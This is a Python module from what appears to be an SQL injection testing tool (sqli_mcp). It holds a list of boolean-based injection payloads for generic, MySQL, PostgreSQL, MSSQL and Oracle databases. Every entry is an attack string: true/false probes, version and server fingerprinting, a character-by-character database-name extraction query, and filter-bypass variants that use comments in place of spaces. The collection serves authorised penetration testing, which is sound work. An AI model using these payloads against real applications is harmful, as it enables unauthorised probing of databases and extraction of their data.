"""Boolean-based SQL injection payloads."""

from sqli_mcp.models import Payload, InjectionType, DatabaseType

BOOLEAN_BASED_PAYLOADS: list[Payload] = [
    # Generic Boolean-based (work across databases)
    Payload(
        value="' AND 1=1-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Boolean true condition"
    ),
    Payload(
        value="' AND 1=2-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Boolean false condition"
    ),
    Payload(
        value="' OR 1=1-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Boolean OR true"
    ),
    Payload(
        value="' OR 1=2-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Boolean OR false"
    ),
    Payload(
        value="' AND 'a'='a",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="String comparison true"
    ),
    Payload(
        value="' AND 'a'='b",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="String comparison false"
    ),
    Payload(
        value="1' AND 1=1-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Numeric prefix boolean true"
    ),
    Payload(
        value="1' AND 1=2-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Numeric prefix boolean false"
    ),
    Payload(
        value="' AND 1=1#",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.MYSQL,
        description="Boolean true with hash comment"
    ),
    Payload(
        value="' AND 1=2#",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.MYSQL,
        description="Boolean false with hash comment"
    ),
    
    # Subquery based boolean
    Payload(
        value="' AND (SELECT 1)=1-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Subquery boolean true"
    ),
    Payload(
        value="' AND (SELECT 1)=2-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Subquery boolean false"
    ),
    
    # Conditional extraction
    Payload(
        value="' AND SUBSTRING(@@version,1,1)='5'-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL version check via SUBSTRING"
    ),
    Payload(
        value="' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL database name extraction"
    ),
    
    # PostgreSQL specific
    Payload(
        value="' AND (SELECT version())::text LIKE '%PostgreSQL%'-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL version detection"
    ),
    
    # MSSQL specific
    Payload(
        value="' AND @@SERVERNAME IS NOT NULL-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL server detection"
    ),
    
    # Oracle specific
    Payload(
        value="' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle boolean with dual"
    ),
    
    # No space variations
    Payload(
        value="'AND'1'='1",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="No space boolean true"
    ),
    Payload(
        value="'/**/AND/**/1=1-- -",
        injection_type=InjectionType.BOOLEAN_BASED,
        database_type=DatabaseType.GENERIC,
        description="Comment as space bypass"
    ),
]
